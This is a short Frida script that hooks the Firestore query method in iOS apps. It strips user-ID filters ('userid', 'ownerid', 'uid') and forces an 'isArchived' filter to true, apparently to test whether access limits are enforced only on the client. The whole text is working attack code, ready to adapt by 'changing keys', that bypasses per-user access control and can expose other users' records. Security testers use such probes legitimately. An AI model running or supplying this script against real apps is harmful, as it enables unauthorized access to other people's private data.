// CHANGE KEYS

// THIS WORKS ONLY IF FIRFirestore AND FIRFirestore IS IN USE
// ALSO APP MUST FILTER WITH queryWhereField:isEqualTo:

// this code check if filters are client-side validated

const Q = ObjC.classes.FIRQuery;
const imp = Q['- queryWhereField:isEqualTo:'].implementation;
const orig = new NativeFunction(imp, 'pointer',
  ['pointer','pointer','pointer','pointer']);

Interceptor.replace(imp, new NativeCallback(function(self,_cmd,field,val){
  const key = new ObjC.Object(field).toString().toLowerCase();
  if (key === 'isarchived') {
    const v = ObjC.classes.NSNumber.numberWithBool_(1);
    console.log("isArchived hijack");
    return orig(self,_cmd,field, v);                 // archived is TRUE
  }
  if (key === 'userid' || key === 'ownerid' || key === 'uid') {
    console.log("userId hijack");
    return self;                                     // delete userId filter
  }
  return orig(self,_cmd,field,val);
}, 'pointer', ['pointer','pointer','pointer','pointer']));
